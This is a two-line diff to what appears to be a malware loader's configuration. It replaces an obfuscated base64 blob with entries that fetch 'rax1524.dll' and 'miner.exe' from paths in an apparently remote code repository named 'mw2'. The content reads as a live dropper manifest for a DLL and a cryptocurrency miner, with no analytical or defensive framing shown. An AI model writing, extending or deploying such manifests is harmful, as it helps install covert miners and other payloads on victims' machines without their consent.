@@ -1,1 +1,2 @@
-w67CisOYw4vDksKbwp/CmMKewoTDjsOGw4bCisKFw4fDgsOLw4bDg8KewpnChcOHw53CmMKFw5jDj8OMw5nChcOCw4/Di8OOw5nChcOHw4vDg8OEwoXDjsOGw4bChMOew5LDnsKgw6/CisOHw4PDhMOPw5jChMOPw5LDj8KKwoXDh8OCw4vDhsODwp7CmcKFw4fDncKYwoXDmMOPw4zDmcKFw4LDj8OLw47DmcKFw4fDi8ODw4TChcOHw4PDhMOPw5jChMOew5LDnsKgwqA=
+D rax1524.dll /mhali43/mw2/refs/heads/main/dll.txt
+E miner.exe /mhali43/mw2/refs/heads/main/miner.txt
